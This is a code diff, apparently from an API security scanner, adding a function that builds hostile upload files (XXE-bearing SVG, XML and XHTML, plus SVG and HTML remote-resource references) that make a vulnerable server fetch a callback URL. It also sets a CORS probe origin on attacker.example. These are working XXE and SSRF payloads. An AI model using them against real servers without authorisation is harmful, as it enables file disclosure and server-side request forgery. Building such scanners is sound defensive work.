@@ -85,6 +85,54 @@ MASS_ASSIGN_SENTINEL = _SENTINEL
 # Access-Control-Allow-Origin together with credentials is a confirmed misconfig.
 CORS_PROBE_ORIGIN = "https://apisec-probe.attacker.example"
 
+
+# Unrestricted file / server-side parsing payloads for URL-fetch document sinks.
+# Each file is hostile markup that, if the backend fetches and PARSES it, causes
+# an out-of-band fetch to `callback`. Confirmation is that callback — proof the
+# server accepted a non-image type AND parsed it (XXE / SVG-SSRF / HTML render).
+# `callback` should be a URL on the catcher server unique to this probe.
+def upload_files(callback: str) -> list[dict]:
+    """Return [{name, content_type, ext, body}] hostile documents."""
+    return [
+        {   # SVG with an XML external entity -> XXE on the image parser
+            "name": "svg_xxe", "ext": "svg", "content_type": "image/svg+xml",
+            "body": (
+                '<?xml version="1.0"?>\n'
+                f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{callback}/svg-xxe">]>\n'
+                '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">'
+                '<text x="0" y="10">&xxe;</text></svg>'
+            ),
+        },
+        {   # SVG that references a remote image -> SSRF via SVG renderer
+            "name": "svg_href", "ext": "svg", "content_type": "image/svg+xml",
+            "body": (
+                '<svg xmlns="http://www.w3.org/2000/svg" '
+                'xmlns:xlink="http://www.w3.org/1999/xlink" width="16" height="16">'
+                f'<image xlink:href="{callback}/svg-href" width="16" height="16"/></svg>'
+            ),
+        },
+        {   # plain XML XXE (document/XML parsers)
+            "name": "xml_xxe", "ext": "xml", "content_type": "application/xml",
+            "body": (
+                '<?xml version="1.0"?>\n'
+                f'<!DOCTYPE r [<!ENTITY e SYSTEM "{callback}/xml-xxe">]>\n'
+                '<r>&e;</r>'
+            ),
+        },
+        {   # HTML with a remote resource -> fetched if rendered/thumbnailed
+            "name": "html_img", "ext": "html", "content_type": "text/html",
+            "body": f'<html><body><img src="{callback}/html-img"></body></html>',
+        },
+        {   # PDF-ish XFA/remote — many OCR stacks fetch external refs in PDFs
+            "name": "xhtml_obj", "ext": "xhtml", "content_type": "application/xhtml+xml",
+            "body": (
+                '<?xml version="1.0"?>\n'
+                f'<!DOCTYPE html [<!ENTITY x SYSTEM "{callback}/xhtml-xxe">]>\n'
+                '<html xmlns="http://www.w3.org/1999/xhtml"><body>&x;</body></html>'
+            ),
+        },
+    ]
+
 # API4 resource-abuse inputs for image/doc endpoints (built locally at runtime
 # by the ml suite; these are descriptors, not fetched URLs).
 RESOURCE_ABUSE = [
